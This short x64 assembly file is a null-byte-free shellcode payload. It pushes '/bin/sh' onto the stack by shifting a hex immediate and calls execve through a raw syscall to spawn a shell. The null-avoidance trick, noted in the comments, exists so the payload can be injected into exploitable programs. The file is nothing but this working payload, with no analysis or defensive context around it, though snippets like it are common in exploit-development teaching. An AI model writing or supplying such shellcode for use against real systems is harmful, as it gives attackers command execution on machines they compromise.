global _start
section .text
      
; Register allocation for x64 function calls
; function_call(%rax) = function(%rdi,  %rsi,  %rdx,  %r10,  %r8,  %r9)
;                ^system          ^arg1  ^arg2  ^arg3  ^arg4  ^arg5 ^arg6
;                 call #
      
_start:
    xor rdi,rdi     ; rdi null
    mov rsi,rdi     ; argv null
    mov rdx,rdi     ; envp null
    mov rdi,0x68732f6e69622f2f ; hs/nib//
    shr rdi,0x08    ; no nulls, so shr to get \0
    push rdi        ; \0hs/nib/
    mov rdi,rsp     ; pointer to arguments
    mov rax,0x3b    ; execve
    syscall         ; make the call